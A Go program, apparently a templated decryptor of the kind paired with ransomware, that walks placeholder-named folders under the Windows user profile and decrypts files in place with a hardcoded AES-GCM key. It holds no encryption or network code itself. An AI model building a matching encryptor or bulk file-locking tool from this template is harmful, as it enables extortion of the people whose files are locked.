package main

import (
	"crypto/aes"
	"crypto/cipher"
	"io"
	"os"
	"path/filepath"
	"strings"
)

const TargetDirsString = "__TARGET_DIRECTORIES__"

func decryptData(cipherText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(cipherText) < nonceSize {
		return nil, io.ErrUnexpectedEOF
	}
	nonce, ciphertext := cipherText[:nonceSize], cipherText[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func decryptFiles() {
	key := []byte("0123456789abcdef0123456789abcdef") 
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		userProfile = "C:\\Users\\Default"
	}

	targetDirectories := strings.Split(TargetDirsString, ",")

	for _, dirName := range targetDirectories {
		dirName = strings.TrimSpace(dirName)
		if dirName == "" {
			continue
		}

		targetDir := filepath.Join(userProfile, dirName)
		if _, err := os.Stat(targetDir); err == nil {
			filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				data, err := os.ReadFile(path)
				if err != nil {
					return nil
				}

				decrypted, err := decryptData(data, key)
				if err == nil {
					os.WriteFile(path, decrypted, 0644)
				}
				return nil
			})
		}
	}
}

func main() {
	decryptFiles()
}